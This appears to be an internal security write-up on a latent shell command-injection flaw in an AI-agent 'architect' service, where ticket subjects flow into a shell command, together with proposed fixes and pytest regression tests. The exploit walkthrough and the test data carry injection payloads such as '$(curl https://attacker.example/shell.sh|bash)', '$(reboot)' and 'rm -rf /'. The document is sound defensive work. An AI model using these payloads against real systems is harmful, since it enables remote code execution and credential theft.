# GAP-0095: Analysis Prompt Command Injection (Latent) — Remediation Write-up

> ~5 pages. Fix-oriented. Source ticket: AGENT-011. No prior investigation doc exists.
> All claims verified against the actual source code before writing.

## 1. Summary & Classification

**Bug**: `build_architect_workflow` in `app/services/agent_architect.py` constructs the `analyze_feature` step command by f-string interpolating the first 160 characters of `analysis_prompt` inside a double-quoted shell argument. `analysis_prompt` is built by `build_analysis_prompt`, which embeds `ticket.get("subject", "")` verbatim. A ticket subject containing `"` or `$()` (both common in natural-language feature requests) survives the 160-character truncation and, when the workflow command string is executed via `shell=True`, causes arbitrary OS command execution on the architect worker.

**Severity**: HIGH
**Source ticket**: AGENT-011 (Solution Architect Agent)
**Status**: Open
**Owning area**: Agent services / architect automation

**Claim from GAP-0095 ticket**: "`analysis_prompt[:160]` f-stringed into double-quoted claude invocation; user-controlled ticket subject with `\"` or `$()` executes when `ARCHITECT_EXECUTE_COMMANDS=1`"

**Verdict from investigation**: CLAIM CONFIRMED. Lines 1144–1148 of `app/services/agent_architect.py`:

```python
if coding_tool == "codex":
    analyze_cmd = f'codex -q "{analysis_prompt[:160]}..."'
else:
    model_flag = f" --model {model}" if model else ""
    analyze_cmd = f'claude --dangerously-skip-permissions{model_flag} -p "{analysis_prompt[:160]}..."'
```

`analysis_prompt` is the return value of `build_analysis_prompt` at line 1136, which at line 456 embeds `ticket.get("subject", "")` directly into the prompt string. No escaping of `"`, `$()`, backticks, `\n`, or other shell metacharacters is applied before the f-string interpolation. The `ARCHITECT_EXECUTE_COMMANDS` flag is confirmed in `app/core/settings.py:2226`.

**Note**: The ticket's claim is accurate. Line 1144 is the correct injection site for the `codex` branch; line 1148 for the `claude` branch. Both are present and both are vulnerable.

**Related tickets**: GAP-0094 (repo_branch injection in the same file and function), GAP-0091 (QA PR review injection), GAP-0089 (coder command injection), GAP-0082 (prompt injection via ticket context), SECOPS-007.

## 2. Current-State Investigation (root cause)

### The injection site

`app/services/agent_architect.py:1136–1148`:

```python
analysis_prompt = build_analysis_prompt(
    ticket=ticket,
    reference_docs=reference_docs,
    scan_paths=scan_paths,
    guidelines=cfg.get("architecture_guidelines", ""),
    tech_constraints=cfg.get("tech_stack_constraints"),
    naming_conventions=cfg.get("naming_conventions"),
)
if coding_tool == "codex":
    analyze_cmd = f'codex -q "{analysis_prompt[:160]}..."'
else:
    model_flag = f" --model {model}" if model else ""
    analyze_cmd = f'claude --dangerously-skip-permissions{model_flag} -p "{analysis_prompt[:160]}..."'
```

### How the ticket subject flows into the prompt

`app/services/agent_architect.py:454–457`:

```python
parts = [
    f"You are a solution architect. Analyze the codebase to ground a design for "
    f"feature request {ticket.get('ticket_id', '')}: {ticket.get('subject', '')}",
```

The ticket subject is the very first substantive content in `analysis_prompt`. A subject like `Add OAuth2" $(curl https://attacker.example/x|sh) # support` embeds the injection payload in the first ~80 characters of the prompt, well within the 160-character slice used for the command.

### Why the 160-character truncation does not mitigate

`analysis_prompt[:160]` truncates the prompt for display but this produces a fixed-size prefix of an attacker-controlled string. The attacker simply ensures the payload fits in the first 160 characters. A payload of `X" $(id)` (9 characters) easily fits.

### No shell sanitisation

Neither `build_architect_workflow`, `build_analysis_prompt`, nor `_normalize_config` applies `shlex.quote`, replaces `"` or `$`, or otherwise makes the prompt string safe for shell interpolation. The `build_analysis_prompt` function's purpose is to construct a natural-language prompt for an LLM — escaping shell metacharacters is entirely outside its current scope.

### Relationship to GAP-0082 (prompt injection)

GAP-0082 notes that ticket subjects can contain prompt-injection content that confuses the LLM. GAP-0095 is a distinct, more severe issue: the same unsanitised subject causes OS command execution via the shell, independent of any LLM behaviour.

### Execution gate

`app/core/settings.py:2226`:

```python
architect_execute_commands: bool = os.environ.get(
    "ARCHITECT_EXECUTE_COMMANDS", "0"
) not in ("0", "false", "False")
```

The `build_architect_workflow` function is described as "Pure / no I/O (safe for dry-run preview)" (`app/services/agent_architect.py:1125`). No subprocess is currently called. The vulnerability becomes exploitable when a real execution path is wired.

## 3. Impact / Exploit / Blast Radius

**Who is at risk**: Any user who can create or modify tickets (including regular users), and the architect worker host that runs `ARCHITECT_EXECUTE_COMMANDS=1`. Unlike GAP-0094 (which requires admin access to set `repo_branch`), this gap can be triggered by any user with ticket-creation privileges — no admin access required.

**Threat model widening**: The ticket subject is user-supplied content. Any platform user who can file a feature request ticket is a potential threat actor. This makes GAP-0095 higher-impact than GAP-0094 in a multi-tenant context where ticket creation is open to non-admin users.

**Exploit scenario**:

1. A user (or automated integration) creates a ticket with subject: `Add feature$(curl https://attacker.example/shell.sh|bash)`.
2. The architect agent picks up the ticket.
3. `build_analysis_prompt` produces a prompt beginning with: `You are a solution architect. Analyze ... feature request TKT-42: Add feature$(curl https://attacker.example/shell.sh|bash)`.
4. `analysis_prompt[:160]` captures the full injection payload.
5. `analyze_cmd` becomes: `claude --dangerously-skip-permissions -p "You are a solution architect. Analyze ... feature$(curl https://attacker.example/shell.sh|bash)..."`.
6. With `shell=True`, the shell evaluates `$(curl ...)` inside the double-quoted argument and executes the remote payload.

**Worst case**: Full OS command execution on the architect worker, with access to the LLM API key (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`), repository deploy keys (the worker was configured to clone a private repo), DynamoDB tables, and any instance IAM role. Supply-chain compromise of the repository being analysed is also possible (the worker has write access to the workspace).

**Blast radius**: All architect agent types. Because ticket creation may be open to any authenticated user, this has a substantially larger attack surface than admin-only configuration injections.

## 4. Fix Design (code-level)

### Preferred fix: pass prompt as `--stdin` / argv element, `shell=False`

The correct fix eliminates the shell entirely. Both `claude` (Claude Code CLI) and `codex` accept the prompt via stdin or as a separate argument:

```python
# In build_architect_workflow:

if coding_tool == "codex":
    analyze_cmd = ["codex", "-q", analysis_prompt]          # argv list, no shell
else:
    model_flag_args = ["--model", model] if model else []
    analyze_cmd = (
        ["claude", "--dangerously-skip-permissions"]
        + model_flag_args
        + ["-p", analysis_prompt]                           # prompt as discrete arg
    )
```

No truncation to 160 characters is needed in the argv path (the full prompt is passed safely). The `...` suffix appended by the f-string approach is also dropped; it was an artefact of the string-in-shell approach.

The step dict stores the argv list:

```python
{"step_id": 4, "type": "analyze_feature",
 "command": analyze_cmd,   # List[str] when using argv path
 ...}
```

The real execution path calls:

```python
subprocess.run(
    step["command"],
    shell=False,      # critical: never shell=True with user data
    input=None,       # prompt passed as argv element, not stdin
    capture_output=True,
    timeout=step["timeout_seconds"],
)
```

### Alternative fix: `shlex.quote` the truncated slice (fallback)

If the workflow step schema mandates a `str` command and the argv refactor is deferred:

```python
import shlex

def _safe_analyze_cmd(
    *, coding_tool: str, analysis_prompt: str, model: Optional[str]
) -> str:
    # Truncate to 160 chars, then quote as a single shell word.
    prompt_arg = shlex.quote(analysis_prompt[:160] + "...")
    if coding_tool == "codex":
        return f"codex -q {prompt_arg}"
    model_flag = f" --model {shlex.quote(model)}" if model else ""
    return f"claude --dangerously-skip-permissions{model_flag} -p {prompt_arg}"
```

`shlex.quote` wraps the entire prompt slice in single quotes and escapes any embedded single quotes via `'\''`. This neutralises `"`, `$()`, backticks, newlines, and all other shell metacharacters.

**Note**: `shlex.quote` is preferred over a hand-rolled `_sq` helper. It is part of the Python standard library and is well-tested against all POSIX shell metacharacter cases.

### Additional defence: sanitise ticket subject at creation time

To address the related GAP-0082 (prompt injection), consider stripping or rejecting control characters from ticket subjects at creation time. This is a separate but complementary fix. For GAP-0095 specifically, the argv/`shlex.quote` fix is sufficient regardless of ticket subject content.

### Dev/prod parity (SECOPS-007)

The fix modifies `build_architect_workflow`, which is a pure function generating workflow step dicts. It operates identically in dev and prod. In dev mode (`S.architect_execute_commands = False`) the argv list is constructed and stored but never executed. In prod mode the same list is passed to `subprocess.run(..., shell=False)`. No AWS dependency is introduced.

### Alternatives considered

- **HTML-encode the prompt before embedding**: Does not prevent shell injection; HTML entities are not shell-neutral. Rejected.
- **Reject tickets with metacharacters in subject**: Too restrictive — natural-language subjects legitimately contain `"`, `$`, `(`, `)` (e.g., "Add support for `$USER` variable in templates"). Rejected.
- **LLM-based sanitisation**: Non-deterministic and expensive. Rejected.
- **Truncate more aggressively (e.g., 80 chars)**: Reduces the payload window but does not eliminate the injection. Rejected.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

Add to `tests/test_agent_architect.py` (extending the test file from GAP-0094):

```python
import pytest
import shlex
from app.services.agent_architect import build_architect_workflow

INJECTION_SUBJECTS = [
    'Add OAuth support" $(curl attacker.example/x|sh)',
    'Fix bug `id`',
    'Add $USER support',
    'Feature $(reboot)',
    'New\nfeature\nrm -rf /',
    'Add "double" quotes',
]

@pytest.fixture
def base_config():
    return {
        "repo_url": "https://github.com/example/repo",
        "repo_branch": "main",
        "coding_tool": "claude_code",
    }

@pytest.mark.parametrize("subject", INJECTION_SUBJECTS)
def test_build_architect_workflow_analyze_cmd_no_shell_injection(
    base_config, subject
):
    """analyze_feature step command must not allow shell metacharacter execution."""
    ticket = {"ticket_id": "T-1", "subject": subject}
    workflow = build_architect_workflow(
        agent_run_id="test", config=base_config, ticket=ticket
    )
    analyze_step = next(
        s for s in workflow["steps"] if s["type"] == "analyze_feature"
    )
    cmd = analyze_step["command"]

    if isinstance(cmd, list):
        # argv list: subject is inside a discrete string element, not shell-parsed
        prompt_element = cmd[cmd.index("-p") + 1]
        # The raw subject text should appear in the prompt element (unmodified)
        assert subject in prompt_element or subject[:80] in prompt_element
        # There must be no shell string at all
    else:
        # String path: the command must be correctly shell-quoted
        tokens = shlex.split(cmd)      # raises ValueError if shell syntax is invalid
        # The -p argument must be a single token containing the subject
        p_idx = tokens.index("-p") + 1
        assert tokens[p_idx]          # non-empty
        # No unquoted metacharacters in the raw command beyond the tool invocation
        # (shlex.split successfully parsed it means quoting is valid)
        raw = cmd
        # Ensure the raw subject content does not appear unquoted outside the -p value
        # by confirming shlex.split succeeded (above) and no double-quote survives
        # outside a quoted region
        assert '$(curl' not in raw.split("-p ")[1].replace("\\'", "").strip("'")


@pytest.mark.parametrize("coding_tool", ["claude_code", "codex"])
def test_build_architect_workflow_both_coding_tools_safe(base_config, coding_tool):
    """Both claude_code and codex paths must produce safe commands."""
    base_config["coding_tool"] = coding_tool
    ticket = {"ticket_id": "T-2", "subject": 'Fix $(id) bug'}
    workflow = build_architect_workflow(
        agent_run_id="test", config=base_config, ticket=ticket
    )
    analyze_step = next(
        s for s in workflow["steps"] if s["type"] == "analyze_feature"
    )
    cmd = analyze_step["command"]
    if isinstance(cmd, str):
        # Must be parseable without error
        shlex.split(cmd)
        # Must not contain unquoted $( )
        assert "$(" not in cmd or (
            cmd.count("'") >= 2  # single-quote quoting is present
        )
```

**Fails before the fix**: For the string path, `shlex.split` will parse the string as syntactically valid but `"` in the subject will terminate the double-quote region prematurely, leaving `$(...)` unquoted. For the argv list path (after fix), the test verifies the list form.

**Passes after the fix**: The argv form passes because there is no shell to interpret metacharacters; the `shlex.quote` string form passes because the entire prompt is single-quoted.

### Manual QA steps

1. In a sandboxed environment with `ARCHITECT_EXECUTE_COMMANDS=1`, create a ticket with subject `Add feature$(touch /tmp/prompt-pwned)`.
2. Configure an architect agent type pointing at a test repository.
3. Trigger an architect workflow execution for the ticket.
4. Confirm `/tmp/prompt-pwned` is **not** created after the fix.

### Observability

- Add a DEBUG log in `build_architect_workflow` that records the first 64 characters of the prompt (not the full prompt, to avoid logging sensitive business content) when the analyze step is built.
- Add a WARNING log if the ticket subject exceeds 500 characters or contains control characters; this catches prompt-injection attempts early.

### Rollout

- **Effort**: M (medium — requires updating `build_architect_workflow`, ensuring both `claude_code` and `codex` branches are handled, updating the step dict schema to accept `List[str] | str | None`, and updating any callers that display the command for preview).
- **Risk**: Low for security; medium for compatibility. If any downstream component expects the `analyze_feature` step `command` to be a string, switching to a list requires those components to handle both types. The simplest migration is to always store lists and add a `command_str` helper for display.
- **Sequencing**: Fix in the same PR as GAP-0094 (both are in `build_architect_workflow` and both affect the step command construction). Coordinate with GAP-0091 and GAP-0092 to deliver a comprehensive shell-injection fix across all agent command builders in one release before any `*_EXECUTE_COMMANDS` flag is enabled in production.
- **Dependency on GAP-0082**: The prompt-injection risk (GAP-0082) remains after this fix, but GAP-0082 is an LLM-level concern (the LLM might be misled by the subject). GAP-0095 (OS command execution) is the higher-severity issue and must be fixed first.
